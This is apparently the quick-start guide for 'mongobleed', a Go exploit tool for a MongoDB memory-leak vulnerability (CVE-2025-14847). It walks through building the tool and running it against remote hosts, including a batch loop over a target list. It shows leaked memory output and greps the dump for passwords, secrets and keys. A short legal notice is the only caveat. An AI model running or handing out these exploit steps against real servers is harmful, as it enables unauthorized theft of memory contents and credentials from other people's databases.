# MongoBleed Go - Quick Start Guide

## 🚀 Quick Start (2 Minutes)

### Step 1: Build
```bash
# If you have Go installed:
go build -o mongobleed mongobleed.go

# Or use the Makefile:
make build
```

### Step 2: Run
```bash
# Basic scan against localhost
./mongobleed

# Scan against remote target
./mongobleed --host 192.168.1.100

# Deep scan for maximum data
./mongobleed --host localhost --max-offset 50000
```

## 📋 What You Get

### Files in This Package
```
mongobleed.go          # Main source code (200 lines)
go.mod                 # Go module file
Makefile              # Build automation
README.md             # Comprehensive documentation
QUICKSTART.md         # This file
COMPARISON.md         # Python vs Go comparison
examples.sh           # Usage examples
verify.go             # Build verification script
```

### After Building
```
mongobleed            # Executable binary (~2MB)
leaked.bin            # Output file (created after run)
```

## 🎯 Common Use Cases

### 1. Quick Security Assessment
```bash
./mongobleed --host target.internal --max-offset 10000
```

### 2. Deep Memory Scan
```bash
./mongobleed --host target.com --min-offset 20 --max-offset 100000 --output deep_scan.bin
```

### 3. Batch Scanning
```bash
for host in $(cat targets.txt); do
    ./mongobleed --host $host --output "leaks_$host.bin"
done
```

## 📊 Understanding Results

### Example Output
```
[*] mongobleed - CVE-2025-14847 MongoDB Memory Leak
[*] Target: localhost:27017
[*] Scanning offsets 20-8192

[+] offset=  117 len=  39: ssions^\x01�r��*YDr���
[+] offset=16582 len=1552: MemAvailable:    8554792 kB\nBuffers: ...
[+] offset=18731 len=3908: Recv SyncookiesFailed EmbryonicRsts ...

[*] Total leaked: 8748 bytes
[*] Unique fragments: 42
[*] Saved to: leaked.bin
```

### What the Numbers Mean
- **offset**: Document length that triggered the leak
- **len**: Number of bytes leaked at this offset
- **Total leaked**: Sum of all unique leaked data
- **Unique fragments**: Number of distinct memory chunks found

### Analyzing leaked.bin
```bash
# View readable strings
strings leaked.bin | less

# Look for specific patterns
grep -i "password\|secret\|key" leaked.bin

# Hex dump for binary analysis
hexdump -C leaked.bin | less
```

## 🔧 Troubleshooting

### "command not found: go"
```bash
# Install Go:
# Ubuntu/Debian: sudo apt-get install golang
# macOS: brew install go
# Or visit: https://golang.org/dl/
```

### "connection refused"
```bash
# Target MongoDB is not running or not accessible
# Check if MongoDB is running: netstat -tlnp | grep 27017
# Check firewall: sudo ufw status
```

### "no leaks found"
```bash
# Target might be patched or not vulnerable
# Try increasing max-offset: --max-offset 100000
# Verify target version: mongod --version
```

## 🛡️ Legal Notice

**This tool is for authorized security testing only.**

- ✅ Your own systems
- ✅ Systems you have permission to test
- ✅ Bug bounty programs
- ✅ Penetration testing engagements

- ❌ Unauthorized systems
- ❌ Production systems without permission
- ❌ Educational networks without consent

## 📚 Next Steps

### Learn More
- Read `README.md` for detailed documentation
- Check `COMPARISON.md` for Python vs Go analysis
- Run `./examples.sh` for usage examples

### Advanced Usage
- Integrate into CI/CD pipelines
- Automate with scripts
- Combine with other security tools
- Create custom output formats

### Testing Environment
```bash
# Set up vulnerable MongoDB with Docker
docker run -d -p 27017:27017 mongo:6.0.25

# Test the exploit
./mongobleed --host localhost
```

## 🐛 Reporting Issues

If you encounter problems:

1. Check the build: `go run verify.go`
2. Verify Go version: `go version`
3. Check target accessibility: `telnet target 27017`
4. Review documentation: `README.md`

## ✨ Features

### Go Implementation Advantages
- ⚡ **3-5x faster** than Python version
- 📦 **Single binary** - no dependencies
- 🖥️ **Cross-platform** - Windows, Linux, macOS
- 💾 **Lower memory usage** - ~8MB vs ~45MB
- 🔒 **Type-safe** - compile-time error checking
- 🚀 **Fast startup** - ~0.01s vs ~0.1s

### Functionality
- ✅ Full CVE-2025-14847 exploitation
- ✅ Configurable scan ranges
- ✅ Binary output with metadata
- ✅ Secret pattern detection
- ✅ Progress indicators
- ✅ Error handling

## 🎓 Educational Value

This implementation demonstrates:
- MongoDB wire protocol
- BSON manipulation
- Zlib compression attacks
- Memory leak exploitation
- Network programming in Go
- Binary protocol implementation

Perfect for:
- Security researchers
- Penetration testers
- Go developers
- Students learning exploit development
